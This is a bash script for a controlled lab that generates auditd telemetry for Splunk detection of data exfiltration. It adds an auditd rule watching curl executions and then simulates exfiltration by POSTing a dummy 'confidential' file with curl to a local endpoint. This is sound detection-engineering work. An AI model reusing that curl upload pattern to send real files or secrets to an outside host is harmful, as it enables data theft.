#!/bin/bash

# ============================================================
# Data Exfiltration Simulation
# Project: Splunk RBA Attack Chain Detection
# Environment: Controlled Kali Linux Lab
#
# Purpose:
# Simulate data exfiltration using curl and generate
# Linux Auditd / EXECVE telemetry for Splunk detection.
# ============================================================


# ------------------------------------------------------------
# Step 1: Check for existing curl execution events
# ------------------------------------------------------------

sudo ausearch -x curl -ts recent


# ------------------------------------------------------------
# Step 2: Identify the curl executable
# ------------------------------------------------------------

which curl


# ------------------------------------------------------------
# Step 3: Configure Auditd to monitor curl execution
# ------------------------------------------------------------

sudo auditctl -a always,exit -F arch=b64 -S execve \
-F path=/usr/bin/curl -k exfiltration


# ------------------------------------------------------------
# Step 4: Verify the Auditd rule
# ------------------------------------------------------------

sudo auditctl -l | grep exfiltration


# ------------------------------------------------------------
# Step 5: Create controlled lab data
# ------------------------------------------------------------

echo "CONFIDENTIAL LAB DATA - RBA TEST" > /tmp/rba_exfil_test.txt


# ------------------------------------------------------------
# Step 6: Simulate data exfiltration using curl
# ------------------------------------------------------------

curl -s -X POST \
--data-binary @/tmp/rba_exfil_test.txt \
http://127.0.0.1:8000/exfil-test


# ------------------------------------------------------------
# Step 7: Verify the generated Auditd telemetry
# ------------------------------------------------------------

sudo ausearch -k exfiltration -ts recent
